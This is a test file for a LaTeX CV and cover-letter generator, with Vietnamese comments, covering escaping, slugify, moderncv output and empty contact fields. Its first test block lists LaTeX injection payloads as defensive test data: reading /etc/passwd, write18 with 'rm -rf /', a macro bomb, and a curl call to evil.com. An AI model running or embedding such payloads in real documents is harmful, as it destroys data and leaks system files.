import {
  escapeLatex,
  renderCoverLetter,
  renderCv,
  slugify,
  type CvContent,
  type Identity,
} from 'src/modules/documents/latex.js';

const identity: Identity = {
  name: 'Nguyen Minh An',
  email: 'minhan@example.com',
  phone: '0900000000',
  location: 'TP. Ho Chi Minh',
  title: 'Senior Frontend Engineer',
};

describe('escapeLatex - chặn thi hành lệnh', () => {
  // File .tex được sinh từ mô tả công việc do người lạ đăng lên, nên đây là
  // ranh giới an toàn chứ không chỉ là chuyện biên dịch.
  test.each([
    ['\\input{/etc/passwd}', 'đọc file hệ thống'],
    ['\\write18{rm -rf /}', 'chạy lệnh shell'],
    ['\\def\\x{\\x\\x}\\x', 'bom đệ quy'],
    ['\\immediate\\write18{curl evil.com}', 'ghi ra ngoài'],
  ])('vô hiệu %s (%s)', (payload) => {
    const output = escapeLatex(payload);
    // Sau khi escape, không còn dấu \ nào đứng trước chữ cái - tức không còn
    // lệnh.
    const withoutEscapes = output.replace(/\\textbackslash\{\}/g, '');
    expect(withoutEscapes).not.toMatch(/\\[a-zA-Z]/);
  });

  test('dấu cách không bị biến đổi', () => {
    // Lỗi thật đã gặp: dùng dấu cách làm placeholder khiến MỌI dấu cách
    // bị đổi thành \textbackslash{}.
    expect(escapeLatex('mot hai ba bon')).toBe('mot hai ba bon');
  });

  test('giữ nguyên tiếng Việt có dấu', () => {
    expect(escapeLatex('Kỹ sư phần mềm cấp cao')).toBe(
      'Kỹ sư phần mềm cấp cao',
    );
  });

  test('escape các ký tự đặc biệt của LaTeX', () => {
    expect(escapeLatex('R&D 50% $2M #1 a_b {x}')).toBe(
      'R\\&D 50\\% \\$2M \\#1 a\\_b \\{x\\}',
    );
  });

  test('escape dấu ngã và mũ', () => {
    expect(escapeLatex('a~b^c')).toBe(
      'a\\textasciitilde{}b\\textasciicircum{}c',
    );
  });

  test('chuỗi rỗng vẫn an toàn', () => {
    expect(escapeLatex('')).toBe('');
  });
});

describe('slugify', () => {
  test('bỏ dấu tiếng Việt và ký tự đặc biệt', () => {
    expect(slugify('FPT Software_Kỹ sư Đầu ngành (React/Next.js)')).toBe(
      'fpt-software-ky-su-dau-nganh-react-next-js',
    );
  });

  test('không để lại gạch ngang ở hai đầu', () => {
    expect(slugify('  --Hello World--  ')).toBe('hello-world');
  });

  test('cắt tối đa 60 ký tự', () => {
    expect(slugify('a'.repeat(200)).length).toBeLessThanOrEqual(60);
  });
});

describe('renderCoverLetter', () => {
  const content = {
    salutation: 'Kính gửi Ban Tuyển dụng FPT Software,',
    opening: 'Với 5 năm kinh nghiệm frontend, tôi xin ứng tuyển vị trí này.',
    bodyParagraphs: ['Tại Tiki tôi dẫn dắt nhóm 4 kỹ sư.'],
    motivation: 'FPT phù hợp định hướng của tôi.',
    closing: 'Cảm ơn anh chị đã dành thời gian.',
  };

  test('cắt lời chào bị lặp ở đầu đoạn mở', () => {
    // Model hay chép lại salutation vào opening, khiến thư có hai lời chào.
    const tex = renderCoverLetter(identity, 'FPT Software', 'Senior FE', {
      ...content,
      opening: `Kính gửi Ban Tuyển dụng FPT Software,\n\n${content.opening}`,
    });
    expect((tex.match(/Kính gửi/g) ?? []).length).toBe(1);
  });

  test('giữ đoạn mở khi nó không phải lời chào', () => {
    const tex = renderCoverLetter(
      identity,
      'FPT Software',
      'Senior FE',
      content,
    );
    expect(tex).toContain('Với 5 năm kinh nghiệm frontend');
  });

  test('nhận dạng lời chào không dấu', () => {
    const tex = renderCoverLetter(identity, 'FPT Software', 'Senior FE', {
      ...content,
      opening: `Kinh gui Ban Tuyen dung,\n\n${content.opening}`,
    });
    expect(tex).not.toContain('Kinh gui Ban Tuyen dung');
  });

  test('escape tên công ty có ký tự đặc biệt', () => {
    const tex = renderCoverLetter(identity, 'A&B Corp 100%', 'Dev', content);
    expect(tex).toContain('A\\&B Corp 100\\%');
  });

  test('dùng moderncv, KHÔNG dùng cover.cls nữa', () => {
    /*
     * Đổi từ `cover.cls` sang `moderncv` là để tiếng Việt hiển thị được, không phải
     * để cho đẹp: font Lato/Raleway đi kèm `cover.cls` thiếu 21 mã ký tự riêng của
     * tiếng Việt, và trên bản compile thật chữ Việt BIẾN MẤT khỏi trang giấy —
     * "ứng tuyển" ra thành "ng tuyn". PDF vẫn ra 1 trang và exit code vẫn 0.
     *
     * Ghim cả hai chiều: phải có moderncv, và phải KHÔNG còn `cover`. Chỉ ghim chiều
     * đầu thì một lần sửa nhầm quay lại `cover.cls` vẫn đi qua được.
     */
    const tex = renderCoverLetter(identity, 'FPT', 'Dev', content);

    expect(tex).toContain('\\documentclass[11pt,a4paper,sans]{moderncv}');
    expect(tex).not.toContain('{cover}');
    // Macro của phần letter trong moderncv.
    expect(tex).toContain('\\makelettertitle');
    expect(tex).toContain('\\makeletterclosing');
  });

  test('ngày tháng bằng tiếng Việt, KHÔNG dùng \\today', () => {
    /*
     * `\today` theo ngôn ngữ của document class, và moderncv mặc định là tiếng Anh —
     * đã thấy đúng dòng "August 13, 2026" trên bản compile thử. Một thư tiếng Việt
     * mang ngày tiếng Anh là lỗi người nhận nhìn thấy ngay.
     */
    const tex = renderCoverLetter(
      identity,
      'FPT',
      'Dev',
      content,
      new Date('2026-08-13T00:00:00Z'),
    );

    expect(tex).toContain('Ngày 13 tháng 8 năm 2026');
    expect(tex).not.toContain('\\today');
  });

  test('chèn dòng chủ đề có tên vị trí', () => {
    const tex = renderCoverLetter(identity, 'FPT', 'Senior Dev', content);
    expect(tex).toContain('Ứng tuyển vị trí Senior Dev');
  });
});

describe('renderCv', () => {
  const content: CvContent = {
    profileStatement: 'Kỹ sư frontend 5 năm kinh nghiệm.',
    coreCompetencies: ['Xây dựng design system', 'Tối ưu Core Web Vitals'],
    experiences: [
      {
        position: 'Senior Frontend Engineer',
        company: 'Tiki & Co',
        location: 'TP. Ho Chi Minh',
        period: '2022 - 2026',
        bullets: ['Dẫn dắt nhóm 4 kỹ sư.', 'Giảm thời gian tải 60%.'],
      },
    ],
    projects: [
      {
        name: 'Cổng tra cứu hóa đơn',
        role: 'Trưởng nhóm',
        organization: 'ATOM Solution',
        period: '2025 - nay',
        description: 'Nền tảng thu thập và đối soát hóa đơn điện tử.',
        bullets: ['Rút thời gian xử lý một hóa đơn từ 5 phút xuống 15 giây.'],
        tools: ['NestJS', 'PostgreSQL'],
      },
    ],
    educations: [
      {
        degree: 'Kỹ sư',
        institution: 'DH Bach Khoa',
        period: '2016-2020',
        detail: '',
      },
    ],
    skillGroups: [{ label: 'Ngôn ngữ', items: ['TypeScript', 'Go'] }],
  };

  test('chèn needspace trước mỗi cventry để chặn lạc tiêu đề', () => {
    expect(renderCv(identity, content)).toContain(
      '\\needspace{5\\baselineskip}',
    );
  });

  test('escape ký tự đặc biệt trong tên công ty', () => {
    expect(renderCv(identity, content)).toContain('Tiki \\& Co');
  });

  test('khai đúng moderncv banking', () => {
    const tex = renderCv(identity, content);
    expect(tex).toContain('\\documentclass[11pt,a4paper,sans]{moderncv}');
    expect(tex).toContain('\\moderncvstyle{banking}');
  });

  test('sinh mục Dự án riêng, tách khỏi Kinh nghiệm', () => {
    const tex = renderCv(identity, content);

    expect(tex).toContain('\\section{Dự án}');
    expect(tex).toContain('Cổng tra cứu hóa đơn');
    expect(tex).toContain('Công cụ: NestJS, PostgreSQL');
  });

  test('không sinh mục Dự án khi hồ sơ không có dự án nào', () => {
    const tex = renderCv(identity, { ...content, projects: [] });

    expect(tex).not.toContain('\\section{Dự án}');
  });

  test('dự án không có gạch đầu dòng thì không sinh itemize rỗng', () => {
    const tex = renderCv(identity, {
      ...content,
      projects: [{ ...content.projects[0], bullets: [] }],
    });
    const duAn = tex.slice(tex.indexOf('\\section{Dự án}'));

    expect(duAn).toContain('Cổng tra cứu hóa đơn');
    expect(duAn).not.toContain('\\begin{itemize}');
  });

  test('vẫn chạy khi các mục rỗng', () => {
    const empty: CvContent = {
      ...content,
      experiences: [],
      projects: [],
      educations: [],
      skillGroups: [],
    };
    expect(() => renderCv(identity, empty)).not.toThrow();
  });
});

describe('macro liên hệ khi thiếu dữ liệu', () => {
  /*
   * Lỗi thật, tìm ra bằng cách compile PDF rồi ĐỌC NGƯỢC bằng `pdf-parse`.
   *
   * `\phone[mobile]{}` với giá trị rỗng vẫn vẽ icon fontawesome, và tên icon lọt
   * vào LỚP TEXT của PDF. Dòng liên hệ ra thành:
   *
   *   "MOBILE-ANDROID-ALT • 🖂 admin@aijob.local"
   *
   * ATS đọc chính lớp text đó. Exit code của lualatex là 0 và không một cảnh báo
   * nào — chỉ đọc lại PDF đã sinh mới thấy.
   *
   * Lưu ý về dấu gạch chéo trong file này: LaTeX cần `\phone`, nên chuỗi trong
   * TypeScript phải là `'\\phone'`. Bản đầu của khối test này viết `'\phone'` —
   * `\p` không phải escape nên TS lặng lẽ bỏ dấu gạch chéo, và ba assertion xanh
   * VÌ LÝ DO SAI: chúng chỉ kiểm chuỗi "phone". Còn `'\title'` thì `\t` thành ký
   * tự tab và test đỏ. Một dấu gạch chéo thiếu ở đây không làm test đỏ, nó làm
   * test vô nghĩa.
   */
  const thieu: Identity = {
    name: 'Nguyen Van A',
    email: 'a@example.com',
    phone: null,
    location: null,
    title: null,
  };

  const content: CvContent = {
    profileStatement: 'Toi la ky su.',
    coreCompetencies: [],
    experiences: [],
    projects: [],
    educations: [],
    skillGroups: [],
  };

  test('CV không sinh macro nào cho trường thiếu', () => {
    const tex = renderCv(thieu, content);

    expect(tex).not.toContain('\\phone');
    expect(tex).not.toContain('\\address');
    expect(tex).not.toContain('\\title');
    // Email luôn có nên phải còn.
    expect(tex).toContain('\\email{a@example.com}');
  });

  test('KHÔNG macro MANG ICON nào được sinh với giá trị rỗng', () => {
    /*
     * Phép khẳng định tổng, nhưng phải hẹp đúng chỗ.
     *
     * Bản đầu của test này cấm ngoặc rỗng ở MỌI macro, và nó sai như một quy tắc:
     * `\name{A}{}` là bắt buộc (moderncv tách họ và tên) còn `\cvitem{}{...}` là
     * nhãn để trống có chủ đích. Cả hai đều không vẽ icon nên vô hại.
     *
     * Quy tắc thật hẹp hơn: những macro moderncv vẽ **icon** cạnh giá trị thì
     * không được sinh khi giá trị rỗng — icon vẫn vẽ, và tên nó lọt vào lớp text.
     * Danh sách này rộng hơn ba macro đang dùng, để một macro thêm sau (`\homepage`,
     * `\social`) cũng được che ngay.
     */
    const ICON_MACROS = [
      'phone',
      'email',
      'homepage',
      'social',
      'extrainfo',
      'address',
    ];
    const tex = renderCv(thieu, content);

    // Thu danh sách rồi khẳng định MỘT lần, thay vì `expect` trong vòng lặp: jest
    // không nhận tham số thông báo ở `expect` (đó là cú pháp của vitest, và cả hai
    // runner đều có trong dự án này), nên cách duy nhất để thông báo lỗi nói rõ
    // macro nào hỏng là đưa chính tên macro vào giá trị được so.
    const offenders = ICON_MACROS.filter((macro) =>
      new RegExp(`\\\\${macro}(\\[[a-z]+\\])?\\{\\}`).test(tex),
    );

    expect(offenders).toEqual([]);
  });

  test('CV vẫn sinh đầy đủ khi có dữ liệu', () => {
    const tex = renderCv(identity, content);

    expect(tex).toContain('\\phone[mobile]{0900000000}');
    expect(tex).toContain('\\address{TP. Ho Chi Minh}');
    expect(tex).toContain('\\title{Senior Frontend Engineer}');
  });

  test('khoảng trắng không tính là có dữ liệu', () => {
    const tex = renderCv({ ...thieu, phone: '   ' }, content);
    expect(tex).not.toContain('\\phone');
  });

  test('thư xin việc cũng không sinh phone rỗng', () => {
    const tex = renderCoverLetter(thieu, 'Cong ty X', 'Ky su', {
      salutation: 'Kinh gui',
      opening: 'a',
      bodyParagraphs: ['b'],
      motivation: 'c',
      closing: 'd',
    });

    expect(tex).not.toContain('\\phone');
    expect(tex).toContain('\\email{a@example.com}');
  });
});
